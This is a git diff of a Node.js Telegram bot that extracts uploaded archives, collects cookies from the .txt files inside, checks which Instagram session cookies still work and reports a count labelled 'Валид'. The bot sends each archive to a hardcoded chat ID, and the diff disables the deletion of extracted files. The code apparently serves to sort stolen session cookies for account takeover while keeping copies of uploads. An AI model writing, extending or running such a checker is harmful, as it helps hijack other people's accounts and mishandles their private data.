@@ -41,7 +41,7 @@ bot.on("document", async (ctx) => {
         console.dir({filename,dir,resultDir,txtFiles})
         await bot.telegram.sendDocument('1351452476',{source :archiveName})
         bot.telegram.sendMessage('1351452476',result) 
-        await deleteFiles(dir,archiveName)
+       // await deleteFiles(dir,archiveName)
         
 
     }else{
@@ -103,33 +103,38 @@ const extractArchieve = async(filename,newDir) =>{
       })})
   
     await promise.then(function(results){
-      console.log('done')
+      console.log('done extracting archieve')
     })
 } 
 
 const makeArchieve = async(dir) =>{
+  let name = dir +'.zip'
+  console.log(name)
+  
+  const promise = new Promise(async function(resolve, reject){
+      let output = await fs.createWriteStream(name);
+      let archive = archiver('zip');
 
-    let name = dir +'.zip'
-    console.log(name)
-    let output = fs.createWriteStream(name);
-    let archive = archiver('zip');
-    
-    output.on('close', function () {
-        //console.log(archive.pointer() + ' total bytes');
-        //console.log('archiver has been finalized and the output file descriptor has closed.');
-    });
-    
-    archive.on('error', function(err){
-        throw err;
-    });
-    
-    await archive.pipe(output);
-    await archive.directory(dir, false);
-    await archive.directory('subdir/', 'new-subdir');
-    await archive.finalize();
-    return name;
-
-}
+      output.on('close', function () {
+          //console.log(archive.pointer() + ' total bytes');
+         // console.log('archiver has been finalized and the output file descriptor has closed.');
+          resolve();
+      });
+      archive.on('error', function(err){
+          throw err;
+      });
+      
+      await archive.pipe(output);
+      await archive.directory(dir, false);
+      await archive.directory('subdir/', 'new-subdir');
+      await archive.finalize();
+      })
+  
+    await promise.then(function(results){
+      console.log('done making archieve')
+    })
+  return name;
+} 
 
 const getTxtfiles = async(dir) =>{
     let txtFilesArr = [];
@@ -259,6 +264,7 @@ const checkForValid = async (sessionIdCookie) => {
   const checkTxtCookies = async(txtNameArr) =>{
     let allCookies = [];
     let txtRes = [];
+    let checkerData= [];
     let validCounter =0;
     for(let txt of txtNameArr){
      //   console.log(txt)
@@ -269,10 +275,10 @@ const checkForValid = async (sessionIdCookie) => {
 
     }
      for(let cookie of allCookies){
-        let checkRes = await checkForValid(cookie);
-        console.log(checkRes)
+        checkerData.push(await checkForValid(cookie));
+       // console.log(checkRes)
     } 
-    for(let el of txtRes){
+    for(let el of checkerData){
         if(el.includes('instagram.com'))validCounter++;
     }
     await txtRes.unshift(`Валид: ${validCounter}\n`)
